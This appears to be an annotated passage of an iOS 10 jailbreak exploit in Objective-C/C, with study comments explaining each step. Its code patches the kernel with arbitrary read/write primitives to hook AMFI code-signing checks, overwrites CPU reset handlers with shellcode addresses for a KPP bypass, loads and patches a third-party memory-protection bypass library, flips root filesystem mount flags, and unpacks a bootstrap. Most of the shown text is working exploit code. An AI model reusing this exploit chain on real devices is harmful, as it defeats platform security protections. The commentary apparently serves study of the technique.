        RemapPage((point & (~PMK)));
        uint64_t remap = NewPointer(point);
        
        // Just checking. Maybe because of the iCache or TLB?
        assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
        
        // ldr x1, 0x8
        WriteAnywhere32(remap, 0x58000041);
        // br x1
        // The "mpo_vnode_check_exec" epilogue is now changed to branch to a hook(shc+0x200).
        WriteAnywhere32(remap + 4, 0xd61f0020);
        // The hook for AMFI. Let's go back and see what it's doing.
        // ...
        // ...
        // ...
        // Okay. It's trying to set all the useful flags in csflags and disable the unuseful ones. Also, it just return 0 to tell AMFI that everything is okay.
        WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
    }
    
    // Every CPU's "cpu_data->cpu_reset_handler" is going to be overwritten with "physcode + 0x100", which is "shellcode + 0x100", which is the mini trampoline for the CPU idle handler.
    // If this exploit is running on a CPU, then all the "cpu_data->cpu_reset_handler" is bound to be filled with the idle handler, and not the sleep handler because the CPUs are still running.
    for (int i = 0; i < z; i++) {
        WriteAnywhere64(plist[i], physcode + 0x100);
    }
    
    // I think it's just trying to wait until the dcache flushes.
    while (ReadAnywhere32(kernvers-4) != 1) {
        sleep(1);
    }
    
    // Done.
    NSLog(@"enabled patches");
    
}
// Damn. That was a fun ride. And a magnificently creative beauty of a bypass that is.
// 
// Reference :
// https://papers.put.as/papers/ios/2011/syscan11_breaking_ios_code_signing.pdf
// http://www.newosxbook.com/articles/CodeSigning.pdf
// https://objective-see.com/blog.html
// https://lab.dsst.io/slides/33c3/slides/7888.pdf
// https://stek29.rocks/2018/01/22/lwvm-mapforio.html
// http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.den0024a/BABCEADG.html
// https://armv8-ref.codingbelief.com/en/
// https://www.blackhat.com/docs/asia-17/materials/asia-17-Bazaliy-Fried-Apples-Jailbreak-DIY.pdf
// https://www.slideshare.net/codeblue_jp/take-a-jailbreak-stunning-guards-for-ios-jailbreak-by-kaoru-otsuka
// https://github.com/opensource-apple/xnu

static int
my_IOConnectTrap4(int conn, long unused, uint64_t x1, uint64_t x2, uint64_t x0, uint64_t func)
{
  uint32_t rv;
  printf("0x%llx(0x%llx, 0x%llx, 0x%llx)\n", func, x0, x1, x2);
  rv = kx5(func, x0, x1, x2, 0, 0);
  printf("-> 0x%x\n", rv);
  return rv;
}

// alright let's see whatsup...
int
unjail2(void)
{
    int rv;

    // On iPhone 7 versions 10.0.x ~ 10.1.x, KPP can be bypassed with a different method. Didn't really dig into this yet
    // Refer to "http://yalu.qwertyoruiop.com/y7.txt"
    // The source code is pretty cryptic cause some macro definitions are left out, probably might have to reverse the .dylib to get some meaning out of it
    // ...
    // ...
    // Recently I had the opportunity to port the 10.2 KPP bypass to pre-10.2 devices. While doing it, I realized that the "cpu_ttep" global variable that was used to setup TTBR1_EL1 in "arm_init_tramp" was not being used!
    // Instead, it directly uses "boot_tte + 0x5000" as the L1 Page Table base. This means that we can't simply load the fake Page Tables into TTBR1_EL1 when the device wakes up from idle or sleep. It can be seen in the following assembly.
    /*
    arm_init_tramp:
        ADD         X0, X25, #4, LSL#12
        ADD         X1, X0, #1, LSL#12
        MSR         TTBR0_EL1, X0
        MSR         TTBR1_EL1, X1
        ...
        ...
    */
    // What this means is that we can't use the "cpu_ttep" global value for the switcharoo thing. Instead, we have to do all of that stuff with ROP. Specifically, the part which "shellcode+0x200(mini trampoline)" used to do, and
    // "shc+0x100(The shellcode part where it puts the fake page table address into TTBR1_EL1)" was doing. In addition, since TTBR1_EL1 is calculated based on the X25 register, we need to have the fake Page Table address correctly
    // calculated and loaded into X25, within the "shellcode+0x200" ROP. How to initiate the "shellcode+0x200" ROP is to place the start of the ROP chain into "cpu_data->cpu_reset_handler", and do the usual ROP thing. If there is anything
    // you need to do Post-FakePageTableSetup, then do that in ROP as well, by setting the Post exploitation ROP chain start address into X30, so that it fires after "arm_init_tramp" finishes and returns to LR. Or better yet,
    // you can just simply jump to kernel shellcode from LR, because "arm_init_tramp" has correctly setup the fake Page Table and flushed the TLB.
    // 
    // Presumably, this is what "http://yalu.qwertyoruiop.com/y7.txt" is doing although I'm not sure because I can't really interpret the source code without the Macro definitions.
    // While it is very doable as seen in the exploit, it requires quite some effort and needs to be tweaked in every different device, and only works for a small range of firmware versions. Therefore, personally I think it would be better
    // use data only attacks which are more portable, as used in Pangu exploits or the recent stream of Jailbreaks based on Ian Beer, Luca Todesco, Pangu, Xerub, Jonathan Levin's techniques.
    if (mp) {
        Dl_info info;
        void (*x)(void *button, mach_port_t tfp0, uint64_t kernel_base, uint64_t allprocs, mach_port_t real_service_port, mach_port_t mitm_port);

        // @qwertyoruiop's memprot bypass

        void *h = dlopen(mp, RTLD_NOW | RTLD_LOCAL);
        if (!h) {
            printf("err: %s\n", dlerror());
            return ERR_INTERNAL;
        }

        x = (void (*)())dlsym(h, "exploit");
        if (!x) {
            printf("err: %s\n", dlerror());
            dlclose(h);
            return ERR_INTERNAL;
        }

        rv = dladdr((void *)x, &info);
        if (!rv) {
            printf("err: %s\n", dlerror());
            dlclose(h);
            return ERR_INTERNAL;
        }

        *(void **)((char *)info.dli_fbase + 0x1C3B8) = (void *)constget;                    // socket
        *(void **)((char *)info.dli_fbase + 0x1C0C0) = (void *)my_IOConnectTrap4;

        x(NULL, tfp0, kernel_base, kaslr_shift, -1, -1);

        dlclose(h);
    } else {
        // Starting from 10.2.x we need to bypass KPP differently
        // Let's dive into this one
        kpp(0, 0, kernel_base, kaslr_shift);
    }

    // Let's go a little bit further and analyze what this piece of code is trying to do.
    if (0) {
        struct utsname uts;
        uname(&uts);

        // Offsets are different according to the kernel version.
        vm_offset_t off = 0xd8;
        if (strstr(uts.version, "16.0.0")) {
            off = 0xd0;
        }

        // Let's only consider 10.2.x. The "rootvnode" global var is located 0x38 down from "gPhysBase" global var
        uint64_t _rootvnode = mp ? (constget(5) + kaslr_shift) : (find_gPhysBase() + 0x38);
        // Read the rootvnode pointer
        uint64_t rootfs_vnode = kread_uint64(_rootvnode);
        // Read "rootvode->v_mount"
        uint64_t v_mount = kread_uint64(rootfs_vnode + off);
        // Read "rootvode->v_mount->mnt_flag" (actually, in the middle of that flag)
        uint32_t v_flag = kread_uint32(v_mount + 0x71);

        // Flip the MNT_ROOTFS flag
        // It should also flip the MNT_RDONLY flag but I think when Apple switched from lwvm to apfs, the / partition is mounted as R/W already, but you just can't write anything to it until you fake remount it.
        kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));

        // remount / so that the kernel refreshes and updates various states that mark the / partition as R/W
        char *nmz = strdup("/dev/disk0s1s1");
        rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
        NSLog(@"remounting: %d", rv);

        v_mount = kread_uint64(rootfs_vnode + off);
        // Flipping the MNT_ROOTFS flag back to it's original value
        kwrite_uint32(v_mount + 0x71, v_flag);
    }

    // This is kinda incomplete. Jumping over to the Cydia branch
    {
        char path[4096];
        uint32_t size = sizeof(path);
        _NSGetExecutablePath(path, &size);
        char *pt = realpath(path, NULL);

        pid_t pd = 0;
        NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];

        NSString *tar = [execpath stringByAppendingPathComponent:@"tar"];
        NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
        NSString *launchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
        const char *jl;

        chdir("/tmp/");

        jl = "/tmp/tar";
        copyfile([tar UTF8String], jl, 0, COPYFILE_ALL);
        chmod(jl, 0755);
        posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL }, NULL);
        NSLog(@"pid = %x", pd);
        waitpid(pd, NULL, 0);

        jl = "/tmp/bin/launchctl";
        copyfile([launchctl UTF8String], jl, 0, COPYFILE_ALL);
        chmod(jl, 0755);
        posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/tmp/Library/LaunchDaemons", NULL }, NULL);
        NSLog(@"pid = %x", pd);
        waitpid(pd, NULL, 0);
    }

    return 0;
}
